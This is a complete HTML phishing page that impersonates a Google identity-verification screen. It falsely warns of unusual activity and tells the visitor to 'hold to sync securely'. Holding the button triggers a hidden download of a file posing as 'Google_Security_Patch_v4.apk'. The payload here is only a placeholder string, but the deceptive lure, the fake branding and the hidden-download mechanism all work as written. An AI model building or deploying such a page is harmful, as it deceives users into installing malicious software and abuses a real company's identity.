<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Google Account | Security Verification</title>
    <style>
      body {
        font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        background-color: #ffffff;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        color: #202124;
      }
      #card {
        width: 400px;
        padding: 48px 40px;
        border: 1px solid #dadce0;
        border-radius: 8px;
        text-align: center;
        box-shadow:
          0 1px 2px 0 rgba(60, 64, 67, 0.3),
          0 1px 3px 1px rgba(60, 64, 67, 0.15);
      }
      .logo {
        margin-bottom: 24px;
      }
      h2 {
        font-size: 24px;
        font-weight: 500;
        margin-bottom: 8px;
        color: #000;
      }
      p {
        font-size: 14px;
        line-height: 1.6;
        color: #3c4043;
        margin-bottom: 24px;
      }

      /* Progress System */
      #progress-container {
        width: 100%;
        background-color: #e8eaed;
        border-radius: 10px;
        margin-bottom: 20px;
        display: none;
        overflow: hidden;
      }
      #progress-bar {
        width: 0%;
        height: 4px;
        background-color: #1a73e8;
        transition: width 0.1s linear;
      }

      .hold-action-area {
        background-color: #f8f9fa;
        border: 2px solid #1a73e8;
        padding: 30px;
        border-radius: 12px;
        cursor: pointer;
        user-select: none;
        transition: all 0.2s ease;
      }
      .hold-action-area:active {
        background-color: #e8f0fe;
        transform: scale(0.97);
        border-style: solid;
      }

      .incognito-icon {
        width: 52px;
        margin-bottom: 12px;
        filter: grayscale(100%);
        opacity: 0.8;
      }

      .btn-text {
        color: #1a73e8;
        font-size: 15px;
        font-weight: 600;
        letter-spacing: 0.5px;
      }

      #status {
        font-size: 13px;
        font-weight: 500;
        color: #d93025;
        margin-top: 20px;
        min-height: 1.2em;
      }
      #hiddenDownload {
        display: none;
      }

      .footer-note {
        margin-top: 32px;
        font-size: 12px;
        color: #70757a;
      }
    </style>
  </head>
  <body>
    <div id="card">
      <img
        src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
        width="75"
        class="logo"
        alt="Google"
      />
      <h2>Verify your identity</h2>
      <p>
        Unusual activity was detected on your device. To continue, hold the
        button below to establish a <b>Secure Incognito Tunnel</b> for
        synchronization.
      </p>

      <div id="progress-container"><div id="progress-bar"></div></div>

      <div id="holdBtn" class="hold-action-area">
        <img
          src="https://www.gstatic.com/images/branding/product/1x/incognito_48dp.png"
          class="incognito-icon"
          alt="Incognito"
        /><br />
        <span class="btn-text">HOLD TO SYNC SECURELY</span>
      </div>

      <p id="status">Action required: Press and hold (3s)</p>

      <div class="footer-note">Protected by Google Identity Services</div>
    </div>

    <!-- Hidden payload link -->
    <a id="hiddenDownload" download="Google_Security_Patch_v4.apk"></a>

    <script>
      const btn = document.getElementById("holdBtn");
      const bar = document.getElementById("progress-bar");
      const container = document.getElementById("progress-container");
      const downloader = document.getElementById("hiddenDownload");
      const statusText = document.getElementById("status");

      let holdTimer;
      let progress = 0;
      let interval;

      btn.addEventListener("mousedown", function () {
        // UI Feedback
        container.style.display = "block";
        statusText.innerText = "Encrypting tunnel...";
        statusText.style.color = "#1a73e8";

        // Animate Progress Bar
        interval = setInterval(() => {
          if (progress < 100) {
            progress += 1.5;
            bar.style.width = progress + "%";
          }
        }, 45);

        // Trigger Download after 3 seconds
        holdTimer = setTimeout(function () {
          // Simulated APK Payload
          downloader.href =
            "data:application/octet-stream;base64,VEhJUyBJUyBBIFNQT09GRUQgRE9XTkxPQUQ=";
          downloader.click();

          statusText.innerText = "Verified. Redirecting to Incognito...";
          statusText.style.color = "#0f9d58";
          clearInterval(interval);
        }, 5000);
      });

      // Reset if user releases too early
      const resetAction = () => {
        if (progress < 100) {
          clearTimeout(holdTimer);
          clearInterval(interval);
          progress = 0;
          bar.style.width = "0%";
          container.style.display = "none";
          statusText.innerText = "Verification failed. Hold longer.";
          statusText.style.color = "#d93025";
        }
      };

      btn.addEventListener("mouseup", resetAction);
      btn.addEventListener("mouseleave", resetAction);
    </script>
  </body>
</html>
